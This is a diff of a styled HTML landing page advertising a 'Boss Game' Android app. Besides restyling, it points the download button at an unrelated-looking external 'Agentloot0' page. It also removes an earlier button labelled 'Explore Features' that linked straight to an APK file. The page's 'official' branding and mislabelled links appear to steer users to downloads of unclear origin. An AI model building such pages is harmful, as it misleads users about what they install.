@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Boss Game - Official App</title>
+<title>Boss Game - Official</title>
 
 <style>
 *{
@@ -20,100 +20,151 @@ body{
 }
 
 .wrapper{
+    width:100%;
     max-width:480px;
-    margin:auto;
     min-height:100vh;
+    margin:auto;
     background:
-    radial-gradient(circle at top,#123d25 0,#06110b 48%);
+    radial-gradient(circle at 50% 0%,#164b2c 0%,#0b2114 28%,#06110b 62%);
     padding-bottom:30px;
 }
 
-/* TOP */
-.top{
-    padding:18px 20px;
+/* HEADER */
+.header{
+    height:70px;
+    padding:0 20px;
     display:flex;
     align-items:center;
     justify-content:space-between;
+    border-bottom:1px solid rgba(65,255,130,.12);
 }
 
-.brand{
+.logo{
     font-size:25px;
     font-weight:900;
-    color:#35f47c;
+    letter-spacing:1px;
+    color:#3dff82;
 }
 
 .menu{
-    font-size:25px;
+    width:40px;
+    height:40px;
+    border-radius:10px;
+    background:#102719;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:22px;
 }
 
 /* HERO */
 .hero{
     text-align:center;
-    padding:15px 20px 30px;
+    padding:32px 20px 25px;
 }
 
 .app-icon{
-    width:105px;
-    height:105px;
-    margin:10px auto 18px;
-    border-radius:25px;
-    background:linear-gradient(145deg,#3cff83,#0b7d39);
+    width:112px;
+    height:112px;
+    margin:0 auto 20px;
+    border-radius:27px;
+
     display:flex;
     align-items:center;
     justify-content:center;
+
+    background:
+    linear-gradient(145deg,#55ff91,#0b8f42);
+
+    border:3px solid #74ffa6;
+
+    color:#03250f;
     font-size:28px;
-    font-weight:900;
-    color:#032b12;
-    border:3px solid #5cff96;
-    box-shadow:0 0 35px rgba(38,255,119,.3);
+    font-weight:1000;
+
+    box-shadow:
+    0 0 20px rgba(50,255,125,.25),
+    0 15px 40px rgba(0,0,0,.4);
 }
 
 h1{
-    font-size:38px;
+    font-size:40px;
+    font-weight:900;
     margin-bottom:8px;
 }
 
 .green{
-    color:#36f47c;
+    color:#3dff82;
 }
 
-.tagline{
-    color:#a9b8ae;
+.subtitle{
+    max-width:360px;
+    margin:auto;
+    color:#9eb0a4;
     font-size:15px;
-    line-height:1.5;
+    line-height:1.6;
 }
 
-/* DOWNLOAD */
+/* DOWNLOAD BUTTON */
 .download{
-    display:block;
-    margin:22px auto 12px;
-    padding:17px 20px;
-    width:92%;
-    border-radius:12px;
-    background:linear-gradient(90deg,#27d968,#42ff88);
-    color:#03150a;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    width:100%;
+    height:58px;
+
+    margin:25px auto 12px;
+
+    border-radius:14px;
+
+    background:linear-gradient(
+        90deg,
+        #20d967,
+        #4cff8c
+    );
+
+    color:#03170a;
     text-decoration:none;
-    font-size:19px;
+
+    font-size:18px;
     font-weight:900;
-    box-shadow:0 8px 25px rgba(34,231,106,.25);
+
+    box-shadow:
+    0 8px 25px rgba(38,240,112,.25);
+
+    transition:.2s;
 }
 
 .download:hover{
-    transform:scale(1.02);
+    transform:translateY(-2px);
+}
+
+.download:active{
+    transform:scale(.97);
 }
 
 /* SECOND BUTTON */
-.more{
-    display:block;
-    width:92%;
-    margin:auto;
-    padding:14px;
-    border:1px solid #245c39;
-    border-radius:12px;
-    color:#d9ffe5;
+.explore{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    width:100%;
+    height:52px;
+
+    border-radius:14px;
+
+    border:1px solid #275b3a;
+
+    background:#0b1b11;
+
+    color:#d5ffe1;
+
     text-decoration:none;
+
+    font-size:15px;
     font-weight:bold;
-    background:#0b1c12;
 }
 
 /* STATS */
@@ -121,95 +172,181 @@ h1{
     display:grid;
     grid-template-columns:repeat(3,1fr);
     gap:10px;
+
     padding:0 18px;
     margin-top:15px;
 }
 
 .stat{
-    background:#0c1d13;
-    border:1px solid #193b27;
-    border-radius:15px;
-    padding:17px 5px;
     text-align:center;
+
+    padding:18px 5px;
+
+    border-radius:15px;
+
+    background:rgba(14,36,23,.85);
+
+    border:1px solid #1b4029;
 }
 
 .stat b{
     display:block;
-    color:#3df77f;
-    font-size:20px;
+    color:#40ff83;
+    font-size:18px;
 }
 
 .stat span{
     display:block;
-    color:#8ea096;
+    margin-top:6px;
+
+    color:#82938a;
     font-size:11px;
-    margin-top:5px;
 }
 
-/* CONTENT */
+/* SECTION */
 .section{
-    padding:22px 20px 0;
+    padding:30px 20px 0;
 }
 
-.section h2{
-    font-size:22px;
-    margin-bottom:12px;
+.section-title{
+    font-size:23px;
+    font-weight:900;
+    margin-bottom:10px;
 }
 
-.section p{
-    color:#aab8ae;
-    line-height:1.7;
+.section-text{
+    color:#9aaea1;
     font-size:14px;
+    line-height:1.7;
 }
 
+/* FEATURES */
 .features{
     display:grid;
     grid-template-columns:1fr 1fr;
     gap:12px;
-    margin-top:15px;
+
+    margin-top:18px;
 }
 
 .feature{
-    background:#0c1d13;
-    border:1px solid #193b27;
-    border-radius:15px;
-    padding:18px 12px;
+    min-height:145px;
+
+    padding:18px 14px;
+
+    border-radius:16px;
+
+    background:#0b1d12;
+
+    border:1px solid #193d27;
 }
 
 .feature-icon{
-    font-size:25px;
-    margin-bottom:8px;
+    width:42px;
+    height:42px;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    margin-bottom:12px;
+
+    border-radius:12px;
+
+    background:#102b19;
+
+    font-size:21px;
 }
 
-.feature b{
-    display:block;
-    margin-bottom:6px;
+.feature-title{
+    font-size:15px;
+    font-weight:bold;
+
+    margin-bottom:7px;
 }
 
-.feature span{
-    color:#91a198;
+.feature-text{
+    color:#819187;
     font-size:12px;
+    line-height:1.5;
+}
+
+/* STEPS */
+.steps{
+    margin-top:25px;
+}
+
+.step{
+    display:flex;
+    align-items:flex-start;
+    gap:13px;
+
+    padding:14px 0;
+
+    border-bottom:1px solid rgba(255,255,255,.06);
+}
+
+.number{
+    min-width:32px;
+    height:32px;
+
+    border-radius:50%;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    background:#183d26;
+    color:#42ff84;
+
+    font-weight:900;
+}
+
+.step-text{
+    color:#a7b5ac;
+    font-size:13px;
     line-height:1.5;
 }
 
 /* NOTICE */
 .notice{
-    margin:22px 20px;
-    padding:15px;
-    border-radius:13px;
-    background:#0c2114;
-    border-left:4px solid #36f47c;
-    color:#b7c8bc;
+    margin:25px 20px 0;
+
+    padding:16px;
+
+    border-radius:14px;
+
+    background:#0c2115;
+
+    border-left:4px solid #3dff82;
+
+    color:#aebdb4;
+
     font-size:12px;
     line-height:1.6;
 }
 
 /* FOOTER */
-footer{
+.footer{
     text-align:center;
+
+    margin-top:30px;
     padding:20px;
-    color:#65736b;
+
+    color:#637168;
     font-size:11px;
+}
+
+@media(max-width:350px){
+
+    h1{
+        font-size:34px;
+    }
+
+    .features{
+        grid-template-columns:1fr;
+    }
+
 }
 </style>
 </head>
@@ -218,12 +355,22 @@ footer{
 
 <div class="wrapper">
 
-    <div class="top">
-        <div class="brand">BOSS GAME</div>
-        <div class="menu">☰</div>
-    </div>
+    <!-- HEADER -->
+    <header class="header">
 
-    <div class="hero">
+        <div class="logo">
+            BOSS GAME
+        </div>
+
+        <div class="menu">
+            ☰
+        </div>
+
+    </header>
+
+
+    <!-- HERO -->
+    <section class="hero">
 
         <div class="app-icon">
             BOSS
@@ -233,32 +380,42 @@ footer{
             Boss <span class="green">Game</span>
         </h1>
 
-        <p class="tagline">
-            Experience a fast, smooth and modern gaming app.
-            Download the latest version and start playing.
+        <p class="subtitle">
+            Welcome to Boss Game. Enjoy a smooth,
+            fast and modern gaming experience.
         </p>
 
-        <!-- DOWNLOAD LINK YAHAN LAGANA HAI -->
+
+        <!-- DOWNLOAD BUTTON -->
+        <!-- YOUR LINK IS HERE -->
+
         <a
             class="download"
-            href="YOUR_SAFE_GAME_DOWNLOAD_LINK"
+            href="https://taskagent.github.io/Agentloot0/"
             target="_blank"
-            rel="noopener">
-            ⬇ DOWNLOAD GAME
+            rel="noopener noreferrer">
+
+            ⬇ &nbsp; DOWNLOAD GAME
+
         </a>
+
 
         <a
-            class="more"
-            href="https://d1bjlwgcobo9al.cloudfront.net/223/20359548/bossrummy_9HFZF9MSXQ7.apk">
-            ★ Explore Features
+            class="explore"
+            href="#features">
+
+            ★ &nbsp; Explore Features
+
         </a>
 
-    </div>
+    </section>
 
-    <div class="stats">
+
+    <!-- STATS -->
+    <section class="stats">
 
         <div class="stat">
-            <b>Fast</b>
+            <b>FAST</b>
             <span>Performance</span>
         </div>
 
@@ -268,61 +425,181 @@ footer{
         </div>
 
         <div class="stat">
-            <b>Android</b>
+            <b>ANDROID</b>
             <span>Supported</span>
         </div>
 
-    </div>
+    </section>
 
-    <div class="section" id="features">
 
-        <h2>Why Choose <span class="green">Boss Game?</span></h2>
+    <!-- ABOUT -->
+    <section class="section">
 
-        <p>
-            Enjoy a clean interface, smooth navigation and
-            an optimized gaming experience on your mobile device.
+        <h2 class="section-title">
+            About <span class="green">Boss Game</span>
+        </h2>
+
+        <p class="section-text">
+            Boss Game is designed with a simple,
+            clean and mobile-friendly interface.
+            Enjoy smooth navigation and a modern
+            gaming experience directly from your device.
         </p>
+
+    </section>
+
+
+    <!-- FEATURES -->
+    <section class="section" id="features">
+
+        <h2 class="section-title">
+            Why Choose <span class="green">Boss Game?</span>
+        </h2>
 
         <div class="features">
 
             <div class="feature">
-                <div class="feature-icon">⚡</div>
-                <b>Fast & Smooth</b>
-                <span>Optimized interface for a smooth experience.</span>
+
+                <div class="feature-icon">
+                    ⚡
+                </div>
+
+                <div class="feature-title">
+                    Fast & Smooth
+                </div>
+
+                <div class="feature-text">
+                    Lightweight interface with smooth
+                    navigation and quick loading.
+                </div>
+
             </div>
 
-            <div class="feature">
-                <div class="feature-icon">📱</div>
-                <b>Mobile Friendly</b>
-                <span>Designed for Android mobile screens.</span>
-            </div>
 
             <div class="feature">
-                <div class="feature-icon">🎮</div>
-                <b>Fun Games</b>
-                <span>Explore exciting casual gaming experiences.</span>
+
+                <div class="feature-icon">
+                    📱
+                </div>
+
+                <div class="feature-title">
+                    Mobile Friendly
+                </div>
+
+                <div class="feature-text">
+                    Optimized layout that looks great
+                    on mobile devices.
+                </div>
+
             </div>
 
+
             <div class="feature">
-                <div class="feature-icon">🔄</div>
-                <b>Latest Version</b>
-                <span>Keep your app updated with the latest release.</span>
+
+                <div class="feature-icon">
+                    🎮
+                </div>
+
+                <div class="feature-title">
+                    Fun Games
+                </div>
+
+                <div class="feature-text">
+                    Discover entertaining and casual
+                    gaming experiences.
+                </div>
+
+            </div>
+
+
+            <div class="feature">
+
+                <div class="feature-icon">
+                    🔄
+                </div>
+
+                <div class="feature-title">
+                    Latest Version
+                </div>
+
+                <div class="feature-text">
+                    Keep your application updated with
+                    the latest available version.
+                </div>
+
             </div>
 
         </div>
 
-    </div>
+    </section>
 
+
+    <!-- HOW TO USE -->
+    <section class="section">
+
+        <h2 class="section-title">
+            How To <span class="green">Get Started</span>
+        </h2>
+
+        <div class="steps">
+
+            <div class="step">
+
+                <div class="number">1</div>
+
+                <div class="step-text">
+                    Click on the Download Game button
+                    above.
+                </div>
+
+            </div>
+
+
+            <div class="step">
+
+                <div class="number">2</div>
+
+                <div class="step-text">
+                    Follow the instructions shown on
+                    the destination page.
+                </div>
+
+            </div>
+
+
+            <div class="step">
+
+                <div class="number">3</div>
+
+                <div class="step-text">
+                    Use apps and games only from sources
+                    you trust.
+                </div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+    <!-- NOTICE -->
     <div class="notice">
-        ⚠️ Download apps only from sources you trust and review
-        the app's permissions before installing.
+
+        ⚠️ Always review an app's permissions and
+        install software only from sources you trust.
+
     </div>
 
-    <footer>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+
         © 2026 Boss Game. All Rights Reserved.
+
     </footer>
 
 </div>
 
 </body>
-  </html>
+    </html>
